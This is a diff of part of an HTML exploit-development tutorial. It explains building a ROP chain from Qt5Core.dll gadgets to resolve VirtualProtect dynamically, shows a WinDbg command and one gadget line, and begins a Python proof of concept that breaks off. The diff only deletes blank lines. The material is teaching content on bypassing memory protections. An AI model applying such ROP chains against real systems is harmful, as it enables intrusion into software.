@@ -1415,11 +1415,9 @@ So, as we see above , the <b>VirtualProtect</b> address is <b>0x762a20d8</b>.&nb
 0:019> ? kernel32!VirtualProtect - 0x762f3c45 
 </pre>
 
-
 <p align="justify">
 The following gadgets have been found and used in order to load the <b>VirtualProtect</b> address dynamically into our exploit.
 </p>
-
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 0x68a812c9 # POP EBP # RETN [Qt5Core.dll]
@@ -1436,7 +1434,6 @@ At the first gadget, EBP is assigned with the hex value <b>0xfffae493</b>. Then,
 <p align="justify">
 Below is an updated PoC that implements the ROP gadgets showed before in order to calculate the <b>VirtualProtect</b> address dynamically and place it into EAX.
 </p>
-
 
 ```python
 import struct
